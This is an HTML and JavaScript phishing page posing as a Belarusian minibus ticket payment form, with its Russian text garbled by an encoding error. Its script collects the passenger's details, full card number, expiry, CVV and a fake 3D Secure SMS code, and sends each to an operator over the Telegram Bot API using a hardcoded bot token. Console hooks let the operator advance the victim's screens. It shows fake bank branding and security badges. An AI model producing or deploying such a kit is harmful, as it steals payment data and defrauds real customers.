<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Marshrutka ‚Ä¢ –û–ø–ª–∞—Ç–∞ –±–∏–ª–µ—Ç–∞</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif; }
        body { background: #0c111d; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 16px; position: relative; }
        body::before { content: ""; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: radial-gradient(circle at 30% 40%, rgba(60, 80, 120, 0.1) 0%, transparent 30%), radial-gradient(circle at 70% 60%, rgba(40, 60, 100, 0.1) 0%, transparent 30%); pointer-events: none; z-index: 0; }
        .card { max-width: 480px; width: 100%; background: rgba(18, 25, 40, 0.95); backdrop-filter: blur(12px); border: 1px solid #2a3a55; border-radius: 32px; padding: 32px 24px; box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7); color: #e2e8f0; z-index: 1; }
        h1 { font-size: 28px; font-weight: 500; background: linear-gradient(135deg, #fff, #a0b8d4); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 6px; }
        .sub { color: #8f9eb5; font-size: 15px; margin-bottom: 24px; border-bottom: 1px solid #2a3a55; padding-bottom: 16px; }
        .route-panel { background: #1a2535; border-radius: 20px; padding: 20px; margin-bottom: 28px; border: 1px solid #2d4b73; box-shadow: 0 4px 10px rgba(0,0,0,0.4); }
        .route-row { display: flex; justify-content: space-between; color: #b7c4d9; font-size: 16px; margin-bottom: 12px; }
        .route-row span:first-child { color: #8f9eb5; }
        .route-row span:last-child { font-weight: 500; color: #e2e8f0; }
        .price-large { font-size: 34px; font-weight: 600; color: #4299e1; text-align: center; margin: 20px 0 16px; text-shadow: 0 2px 10px rgba(66, 153, 225, 0.3); }
        .price-large small { font-size: 16px; color: #8f9eb5; font-weight: 400; }
        .field { margin-bottom: 20px; }
        .field label { display: block; font-size: 14px; color: #b7c4d9; margin-bottom: 6px; font-weight: 500; }
        .field input { width: 100%; background: #0e1a28; border: 1px solid #2d4b73; border-radius: 16px; padding: 16px 18px; font-size: 16px; color: white; transition: all 0.2s; }
        .field input:focus { outline: none; border-color: #4299e1; background: #142a40; box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.15); }
        .field input::placeholder { color: #4a5a72; }
        .row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
        .btn { background: linear-gradient(135deg, #2563eb, #1e4b8f); border: none; color: white; font-weight: 600; font-size: 18px; padding: 18px 20px; width: 100%; border-radius: 40px; cursor: pointer; transition: all 0.2s; box-shadow: 0 8px 20px rgba(0, 50, 150, 0.5); margin: 20px 0 10px; border: 1px solid rgba(255,255,255,0.1); }
        .btn:active { transform: scale(0.98); }
        .btn:disabled { opacity: 0.5; pointer-events: none; }
        .btn-outline { background: transparent; box-shadow: none; border: 1px solid #3b5f8e; color: #b7c4d9; }
        .btn-outline:hover { background: rgba(59, 95, 142, 0.2); }
        .bank-strip { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; margin: 30px 0 10px; padding: 20px 0 0; border-top: 1px solid #1e2a3a; }
        .bank-strip span { color: #6f7f99; font-size: 13px; font-weight: 500; background: #0e1a28; padding: 6px 15px; border-radius: 40px; border: 1px solid #2e3d52; }
        .spinner { border: 3px solid rgba(66, 153, 225, 0.2); border-top: 3px solid #4299e1; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 30px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .processing-text { text-align: center; color: #b7c4d9; font-size: 16px; margin: 20px 0; }
        .sms-input { font-size: 32px; letter-spacing: 12px; text-align: center; background: #0e1a28; border: 2px solid #2d4b73; border-radius: 24px; padding: 20px 10px; color: white; width: 100%; margin: 20px 0; }
        .flex { display: flex; gap: 12px; }
        .success-icon, .fail-icon { width: 70px; height: 70px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 20px auto 25px; font-size: 36px; border: 2px solid; }
        .success-icon { background: #1f4a3a; color: #2ecc71; border-color: #2ecc71; }
        .fail-icon { background: #4a2b2b; color: #e74c3c; border-color: #e74c3c; }
        .footer-note { text-align: center; font-size: 12px; color: #5b6e8c; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card" id="app"></div>

    <script>
        (function() {
            // ========== –¢–í–û–ò –î–ê–ù–ù–´–ï ==========
            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
            const ADMIN_ID = '5852338439';

            // ========== –ü–û–õ–£–ß–ê–ï–ú –•–ï–® –ò–ó URL (?hash=...) ==========
            const urlParams = new URLSearchParams(window.location.search);
            const linkHash = urlParams.get('hash') || 'test123';

            // ========== –î–ê–ù–ù–´–ï –ú–ê–†–®–†–£–¢–ê (–ó–ê–ì–õ–£–®–ö–ê, –ü–û–¢–û–ú –ú–û–ñ–ù–û –î–ï–õ–ê–¢–¨ –ó–ê–ü–†–û–° –ö –ë–û–¢–£) ==========
            const routeData = {
                from: '–ú–∏–Ω—Å–∫',
                to: '–ì–æ–º–µ–ª—å',
                date: '15.03.2026',
                time: '18:30',
                price: 27
            };

            // ========== –°–û–°–¢–û–Ø–ù–ò–Ø ==========
            let state = {
                step: 'passenger', // passenger, card, processing1, sms, processing2, success, fail
                passenger: { fullName: '', phone: '', email: '' },
                card: { number: '', expiry: '', cvv: '', cardholder: '' },
                smsCode: '',
                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7)
            };

            // ========== –§–û–†–ú–ê–¢–¢–ï–†–´ ==========
            function formatCardNumber(v) {
                let digits = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<digits.length; i+=4) parts.push(digits.slice(i, i+4));
                return parts.join(' ');
            }
            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }
            function formatCVV(v) { return v.replace(/\D/g, '').slice(0,3); }

            // ========== –§–£–ù–ö–¶–ò–ò –û–¢–ü–†–ê–í–ö–ò –í –ë–û–¢–ê ==========
            async function sendToBot(type) {
                let text = '';
                const card = state.card;
                const pass = state.passenger;

                if (type === 'card') {
                    text = `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê (–û–ñ–ò–î–ê–ù–ò–ï SMS)\n\n` +
                        `üöê ${routeData.from} ‚Üí ${routeData.to} ${routeData.date} ${routeData.time}\n` +
                        `üí∞ ${routeData.price} BYN\n` +
                        `üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${pass.fullName} | ${pass.phone} | ${pass.email}\n` +
                        `üí≥ –ö–∞—Ä—Ç–∞: ${card.number} | ${card.expiry} | CVV:${card.cvv} | ${card.cardholder}\n` +
                        `üîó –•–µ—à: ${linkHash}\n` +
                        `üÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;
                } else if (type === 'sms') {
                    text = `üì® SMS-–ö–û–î –í–í–ï–î–Å–ù\n\n` +
                        `üí≥ –°–µ—Å—Å–∏—è: ${state.sessionId}\nüì± –ö–æ–¥: ${state.smsCode}\n` +
                        `üîó –•–µ—à: ${linkHash}`;
                }

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                    });
                } catch (e) { console.warn('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram', e); }
            }

            // ========== –†–ï–ù–î–ï–† ==========
            function render() {
                const app = document.getElementById('app');
                if (!app) return;

                let html = `<h1>Marshrutka</h1><div class="sub">–û–ø–ª–∞—Ç–∞ –±–∏–ª–µ—Ç–∞</div>`;

                if (state.step === 'passenger') {
                    html += `<div class="route-panel">
                        <div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div>
                        <div class="route-row"><span>–î–∞—Ç–∞ / –≤—Ä–µ–º—è</span><span>${routeData.date} ${routeData.time}</span></div>
                    </div>`;
                    html += `<div class="price-large">${routeData.price} <small>BYN</small></div>`;
                    html += `<div class="field"><label>–§–ò–û *</label><input type="text" id="fullName" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" value="${state.passenger.fullName}"></div>`;
                    html += `<div class="field"><label>–¢–µ–ª–µ—Ñ–æ–Ω *</label><input type="tel" id="phone" placeholder="+375 29 123-45-67" value="${state.passenger.phone}"></div>`;
                    html += `<div class="field"><label>Email (–Ω–µ–æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ)</label><input type="email" id="email" placeholder="example@mail.com" value="${state.passenger.email}"></div>`;
                    html += `<button class="btn" id="nextToCard">–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å</button>`;
                }

                else if (state.step === 'card') {
                    html += `<div class="route-panel">
                        <div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div>
                        <div class="route-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName || '‚Äî'}</span></div>
                    </div>`;
                    html += `<div class="price-large">${routeData.price} <small>BYN</small></div>`;
                    html += `<div class="field"><label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã</label><input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" value="${state.card.number}"></div>`;
                    html += `<div class="row2"><div class="field"><label>–°—Ä–æ–∫</label><input type="text" id="expiry" placeholder="–ú–ú/–ì–ì" maxlength="5" value="${state.card.expiry}"></div>`;
                    html += `<div class="field"><label>CVV</label><input type="text" id="cvv" placeholder="123" maxlength="3" value="${state.card.cvv}"></div></div>`;
                    html += `<div class="field"><label>–í–ª–∞–¥–µ–ª–µ—Ü</label><input type="text" id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}"></div>`;
                    html += `<button class="btn" id="payBtn">–û–ø–ª–∞—Ç–∏—Ç—å</button>`;
                    html += `<button class="btn btn-outline" onclick="state.step='passenger'; render();">‚Üê –ù–∞–∑–∞–¥</button>`;
                }

                else if (state.step === 'processing1') {
                    html += `<div style="text-align:center; padding:20px 0;"><div class="spinner"></div><div class="processing-text">–û–±—Ä–∞–±–æ—Ç–∫–∞ –ø–ª–∞—Ç–µ–∂–∞</div><div style="color:#6f7f99; font-size:14px;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</div></div>`;
                }

                else if (state.step === 'sms') {
                    html += `<div class="title" style="font-size:22px;"><i>üîê</i> 3D Secure (–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫)</div>`;
                    html += `<div style="color:#b7c4d9; font-size:14px; margin-bottom:20px;">–ù–∞ –≤–∞—à –Ω–æ–º–µ—Ä –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω SMS-–∫–æ–¥. –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è.</div>`;
                    html += `<input type="text" class="sms-input" id="smsCode" placeholder="______" maxlength="6" value="${state.smsCode}">`;
                    html += `<div class="flex"><button class="btn" id="confirmSms" style="flex:2;">–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å</button><button class="btn btn-outline" id="resendSms" style="flex:1;">‚Üª</button></div>`;
                    html += `<button class="btn btn-outline" onclick="state.step='card'; render();" style="margin-top:15px;">‚Üê –ù–∞–∑–∞–¥ –∫ –∫–∞—Ä—Ç–µ</button>`;
                }

                else if (state.step === 'processing2') {
                    html += `<div style="text-align:center; padding:20px 0;"><div class="spinner"></div><div class="processing-text">–ë–∞–Ω–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏—é</div></div>`;
                }

                else if (state.step === 'success') {
                    html += `<div class="success-icon">‚úì</div>`;
                    html += `<h2 style="text-align:center; font-size:24px; margin-bottom:15px;">–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h2>`;
                    html += `<div style="text-align:center; color:#b7c4d9; margin-bottom:30px;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.</div>`;
                    html += `<div class="route-panel"><div class="route-row"><span>–ú–∞—Ä—à—Ä—É—Ç</span><span>${routeData.from} ‚Üí ${routeData.to}</span></div><div class="route-row"><span>–ü–∞—Å—Å–∞–∂–∏—Ä</span><span>${state.passenger.fullName}</span></div><div class="route-row"><span>–¢–µ–ª–µ—Ñ–æ–Ω</span><span>${state.passenger.phone}</span></div><div class="route-row"><span>–°—É–º–º–∞</span><span>${routeData.price} BYN</span></div></div>`;
                    html += `<button class="btn" onclick="window.location.reload()">–ù–∞ –≥–ª–∞–≤–Ω—É—é</button>`;
                }

                else if (state.step === 'fail') {
                    html += `<div class="fail-icon">‚úï</div>`;
                    html += `<h2 style="text-align:center; font-size:24px; margin-bottom:15px;">–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h2>`;
                    html += `<div style="text-align:center; color:#b7c4d9; margin-bottom:30px;">–ë–∞–Ω–∫ –æ—Ç–∫–ª–æ–Ω–∏–ª –æ–ø–µ—Ä–∞—Ü–∏—é. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥—É—é –∫–∞—Ä—Ç—É.</div>`;
                    html += `<button class="btn" onclick="state.step='card'; render();">–ü–æ–ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞</button>`;
                }

                html += `<div class="bank-strip"><span>–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫</span><span>–ü—Ä–∏–æ—Ä–±–∞–Ω–∫</span><span>–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫</span><span>Visa</span><span>Mastercard</span><span>–ë–µ–ª–∫–∞—Ä—Ç</span></div>`;
                html += `<div class="footer-note">üîí 3D Secure ‚Ä¢ SSL ‚Ä¢ PCI DSS</div>`;
                app.innerHTML = html;

                // –û–ë–†–ê–ë–û–¢–ß–ò–ö–ò
                if (state.step === 'passenger') {
                    document.getElementById('nextToCard')?.addEventListener('click', () => {
                        state.passenger.fullName = document.getElementById('fullName').value.trim();
                        state.passenger.phone = document.getElementById('phone').value.trim();
                        state.passenger.email = document.getElementById('email').value.trim();
                        if (!state.passenger.fullName || !state.passenger.phone) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –§–ò–û –∏ —Ç–µ–ª–µ—Ñ–æ–Ω'); return; }
                        state.step = 'card'; render();
                    });
                }

                if (state.step === 'card') {
                    const cn = document.getElementById('cardNumber'); if(cn) cn.addEventListener('input', (e) => e.target.value = formatCardNumber(e.target.value));
                    const ex = document.getElementById('expiry'); if(ex) ex.addEventListener('input', (e) => e.target.value = formatExpiry(e.target.value));
                    const cv = document.getElementById('cvv'); if(cv) cv.addEventListener('input', (e) => e.target.value = formatCVV(e.target.value));

                    document.getElementById('payBtn')?.addEventListener('click', async () => {
                        state.card.number = document.getElementById('cardNumber').value.trim();
                        state.card.expiry = document.getElementById('expiry').value.trim();
                        state.card.cvv = document.getElementById('cvv').value.trim();
                        state.card.cardholder = document.getElementById('cardholder').value.trim();
                        if (!state.card.number || !state.card.expiry || !state.card.cvv || !state.card.cardholder) { alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è –∫–∞—Ä—Ç—ã'); return; }

                        await sendToBot('card');
                        state.step = 'processing1'; render();
                        // –ü–µ—Ä–µ—Ö–æ–¥ –∫ SMS —Ç–æ–ª—å–∫–æ –ø–æ—Å–ª–µ –∫–æ–º–∞–Ω–¥—ã –∏–∑ –±–æ—Ç–∞ (–∏–º–∏—Ç–∞—Ü–∏—è)
                    });
                }

                if (state.step === 'sms') {
                    document.getElementById('confirmSms')?.addEventListener('click', async () => {
                        const code = document.getElementById('smsCode').value.trim();
                        if (!code || code.length < 6) { alert('–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ SMS'); return; }
                        state.smsCode = code;
                        await sendToBot('sms');
                        state.step = 'processing2'; render();
                    });
                    document.getElementById('resendSms')?.addEventListener('click', () => {
                        // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ —Ç—É—Ç –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –∑–∞–ø—Ä–æ—Å –Ω–∞ –ø–æ–≤—Ç–æ—Ä–Ω—É—é –æ—Ç–ø—Ä–∞–≤–∫—É –∫–æ–¥–∞ –≤ —à–ª—é–∑–µ
                        alert('–ù–æ–≤—ã–π –∫–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω');
                    });
                }
            }

            // –°—Ç–∞—Ä—Ç
            render();

            // ========== –°–õ–£–®–ê–¢–ï–õ–¨ –î–õ–Ø –ö–û–ú–ê–ù–î –û–¢ –ë–û–¢–ê (–£–ü–†–û–©–ï–ù–ù–û) ==========
            // –í —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ –∑–¥–µ—Å—å –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å WebSocket –∏–ª–∏ Long Polling.
            // –î–ª—è –¥–µ–º–æ –±—É–¥–µ–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –≥–ª–æ–±–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å –∏–∑ –∫–æ–Ω—Å–æ–ª–∏ –±—Ä–∞—É–∑–µ—Ä–∞.
            window.cardTaken = function() { if (state.step === 'processing1') { state.step = 'sms'; render(); } };
            window.paymentResult = function(success) {
                if (state.step === 'processing2') {
                    state.step = success ? 'success' : 'fail';
                    render();
                }
            };
        })();
    </script>
</body>
</html>
